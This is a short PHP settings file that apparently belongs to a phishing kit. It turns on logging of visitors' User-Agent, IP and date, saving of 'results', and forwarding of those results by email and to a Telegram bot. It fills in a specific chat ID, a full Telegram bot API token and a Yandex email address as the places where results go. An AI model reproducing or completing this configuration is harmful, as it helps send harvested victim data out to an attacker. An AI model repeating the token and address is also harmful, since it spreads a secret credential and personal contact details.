<?php

$settings = array(
	"log_user"		=> "1",	// Log User-Agent, IP and Date
	"debug"			=> "0",	// Print Errors
	"send_mail"		=> "1",	// Send E-Mail To Your Mail
	"save_results"	=> "1",	// Save Results 
	"telegram"		=> "1",	// Send Results to telegram
	"chat_id"		=> "915867987",	// Chat ID Of You
	"bot_url"		=> "bot5564380540:AAGHEAJ5ZSUzlpkZ5BEYah18oEfP1f-8fnA",	// Your Bot API Key (ADD "bot" BEFORE API KEY)
	"email"			=> "jacksrodney@yandex.com",	// Your E-Mail
);
return $settings;



?>

